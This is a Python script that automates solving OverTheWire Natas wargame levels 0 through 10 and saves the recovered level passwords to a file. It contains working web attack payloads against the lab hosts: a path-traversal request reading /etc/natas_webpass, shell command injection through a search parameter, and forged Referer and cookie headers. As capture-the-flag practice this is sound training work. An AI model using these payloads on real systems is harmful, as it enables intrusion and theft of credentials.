import ssl
import sys
import json
import time
import requests
import base64
import os
import urllib2
import string
import binascii
from string import ascii_lowercase
from bs4 import BeautifulSoup


def encodeCreds(username, password):
    stringToBeEncoded = username + ':' + password
    auth_64 = base64.b64encode(stringToBeEncoded)
    # Base64 encoding is doing something weird and adding 'Cg== on the end'
    # auth_64 = auth_64.replace('Cg==', '')
    return(auth_64)

def login(username, password, url, headers):
    with requests.Session() as s:
        post = s.get(url, headers=headers)
    return(post.text)

def post(username, password, url, headers, data):
    with requests.Session() as s:
        post = s.post(url, headers=headers, data=data)
    return(post.text)

def eraseFile():
    filename = 'flags.txt'
    file = open(filename, 'w')
    file.write('')
    return()

def writeToFlagFile(flagToWrite, level):
    filename = 'flags.txt'
    file = open(filename, "a")
    file.write('Level ' + level + '\t- ' + flagToWrite + '\n')
    file.close()
    return()

def cleanFlagFile():
    fileName = 'flags.txt'
    with open('flags.txt', 'r+') as file:
        lines = file.readlines()
        file.seek(0)
        file.writelines(line for line in lines if line.strip())
        file.truncate()
    file.close()
    return()

def cleanFlag(password):
    password = password.replace('\n', '')
    return(password)

def natas0():
    url = 'http://natas0.natas.labs.overthewire.org/'
    username = 'natas0'
    password = 'natas0'
    auth_64 = encodeCreds(username, password)
    headers = {
        'Authorization': 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 0 [+]')
    response = login(username, password, url, headers)
    natas1Password = response[857:889]
    print('Password for the next level is: ' + natas1Password)
    return(natas1Password)

def natas1(natas1Password):
    url = 'http://natas1.natas.labs.overthewire.org/'
    username = 'natas1'
    auth_64 = encodeCreds(username, natas1Password)
    headers = {
        'Authorization': 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 1 [+]')
    response = login(username, natas1Password, url, headers)
    natas2Password = response[1002:1034]
    print('Password for the next level is: ' + natas2Password)
    return(natas2Password)

def natas2(natas2Password):
    url = 'http://natas2.natas.labs.overthewire.org/files/users.txt'
    username = 'natas2'
    auth_64 = encodeCreds(username, natas2Password)
    headers = {
        'Authorization': 'Basic ' + auth_64
    }
    userToMatch = 'natas3'
    userPassword = ''
    print('[+] Logging into Natas 2 [+]')
    fileContent = requests.get(url, allow_redirects=True, headers=headers)
    open('natas2.tmp', 'wb').write(fileContent.content)
    with open('natas2.tmp', 'r') as file:
        for line in file:
            if userToMatch in line:
                userPassword = line.replace('natas3:', '')
                file.close()
                break
    userPassword = cleanFlag(userPassword)
    print('Password for the next level is: ' + userPassword)
    os.remove('natas2.tmp')
    return(userPassword)

def natas3(natas3Password):
    url = 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
    username = 'natas3'
    auth_64 = encodeCreds(username, natas3Password)
    headers = {
        'Authorization': 'Basic ' + auth_64
    }
    userToMatch = 'natas4'
    userPassword = ''
    print('[+] Logging into Natas 3 [+]')
    fileContent = requests.get(url, allow_redirects=True, headers=headers)
    open('natas3.tmp', 'wb').write(fileContent.content)
    with open('natas3.tmp', 'r') as file:
        for line in file:
            if userToMatch in line:
                userPassword = line.replace('natas4:', '')
                break
    file.close()
    userPassword = cleanFlag(userPassword)
    print('Password for the next level is: ' + userPassword)
    os.remove('natas3.tmp')
    return(userPassword)

def natas4(natas4Password):
    url = 'http://natas4.natas.labs.overthewire.org'
    username = 'natas4'
    auth_64 = encodeCreds(username, natas4Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64,
        'Referer' : 'http://natas5.natas.labs.overthewire.org/'
    }
    print('[+] Logging into Natas4 [+]')
    response = login(username, natas4Password, url, headers)
    natas5Password = response[836:868]
    print('Password for the next level is: ' + natas5Password)
    return(natas5Password)

def natas5(natas5Password):
    url = 'http://natas5.natas.labs.overthewire.org'
    username = 'natas5'
    auth_64 = encodeCreds(username, natas5Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64,
        'Cookie' : 'loggedin=1'
    }
    print('[+] Logging into Natas5 [+]')
    response = login(username, natas5Password, url, headers)
    natas6Password = response[835:867]
    print('Password for the next level is: ' + natas6Password)
    return(natas6Password)

def natas6(natas6Password):
    url = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
    posturl = 'http://natas6.natas.labs.overthewire.org/'
    username = 'natas6'
    auth_64 = encodeCreds(username, natas6Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 6 [+]')
    response = login(username, natas6Password, url, headers)
    secret = response[14:33]
    data = {
        'secret' : secret,
        'submit' : 'Submit'
    }
    accessGrantedResponse = post(username, natas6Password, posturl, headers, data)
    natas7Password = accessGrantedResponse[836:868]
    natas7Password = cleanFlag(natas7Password)
    print('Password for the next level is: ' + natas7Password)
    return(natas7Password)

def natas7(natas7Password):
    url = 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../etc/natas_webpass/natas8'
    username = 'natas7'
    auth_64 = encodeCreds(username, natas7Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 7 [+]')
    response = login(username, natas7Password, url, headers)
    natas8Password = response[883:916]
    natas8Password = cleanFlag(natas8Password)
    print('Password for the next level is: ' + natas8Password)
    return(natas8Password)

def natas8(natas8Password):
    url = 'http://natas8.natas.labs.overthewire.org/index-source.html'
    posturl = 'http://natas8.natas.labs.overthewire.org/'
    username = 'natas8'
    auth_64 = encodeCreds(username, natas8Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 8 [+]')
    response = login(username, natas8Password, url, headers)
    encodedSecret = response[1229:1261]
    encodedSecret = binascii.unhexlify(encodedSecret)
    encodedSecret = encodedSecret[::-1]
    encodedSecret = base64.b64decode(encodedSecret)
    data= {
        'secret' : encodedSecret,
        'submit' : 'Submit'
    }
    postResponse = post(username, natas8Password, posturl, headers, data)
    natas9Password = postResponse[836:868]
    print('Password for the next level is: ' + natas9Password)
    natas9Password = cleanFlag(natas9Password)
    return(natas9Password)

def natas9(natas9Password):
    url = 'http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search'
    username = 'natas9'
    auth_64 = encodeCreds(username, natas9Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 9 [+]')
    response = login(username, natas9Password, url, headers)
    natas10Password = response[918:950]
    print('Password for the next level is: ' + natas10Password)
    natas10Password = cleanFlag(natas10Password)
    return(natas10Password)

def natas10(natas10Password):
    username = 'natas10'
    auth_64 = encodeCreds(username, natas10Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 10 [+]')
    for c in ascii_lowercase:
        url = "http://natas10.natas.labs.overthewire.org/?needle=" + str(c) + "+%2Fetc%2Fnatas_webpass%2Fnatas11+&submit=Search"
        response = login(username, natas10Password, url, headers)
        if '/etc/natas_webpass' in response[0:1100]:
            natas11Password = response[1016:1048]
            break
    #natas11Password = response
    print('Password for the next level is: ' + natas11Password)
    natas11Password = cleanFlag(natas11Password)
    return(natas11Password)

def natas11(natas11Password):
    username = 'natas11'
    auth_64 = encodeCreds(username, natas11Password)
    headers = {
        'Authorization' : 'Basic ' + auth_64
    }
    print('[+] Logging into Natas 11 [+]')
    return()

def main():
    os.system('clear')
    print('[+] Cleaning flags.txt of old passwords [+]')
    eraseFile()
    natas1Password = natas0()
    writeToFlagFile(natas1Password, '1')
    natas2Password = natas1(natas1Password)
    writeToFlagFile(natas2Password, '2')
    natas3Password = natas2(natas2Password)
    writeToFlagFile(natas3Password, '3')
    natas4Password = natas3(natas3Password)
    writeToFlagFile(natas4Password, '4')
    natas5Password = natas4(natas4Password)
    writeToFlagFile(natas5Password, '5')
    natas6Password = natas5(natas5Password)
    writeToFlagFile(natas6Password, '6')
    natas7Password = natas6(natas6Password)
    writeToFlagFile(natas7Password, '7')
    natas8Password = natas7(natas7Password)
    writeToFlagFile(natas8Password, '8')
    natas9Password = natas8(natas8Password)
    writeToFlagFile(natas9Password, '9')
    natas10Password = natas9(natas9Password)
    writeToFlagFile(natas10Password, '10')
    natas11Password = natas10(natas10Password)
    writeToFlagFile(natas11Password, '11')

    cleanFlagFile()



if __name__ == "__main__":
    main()
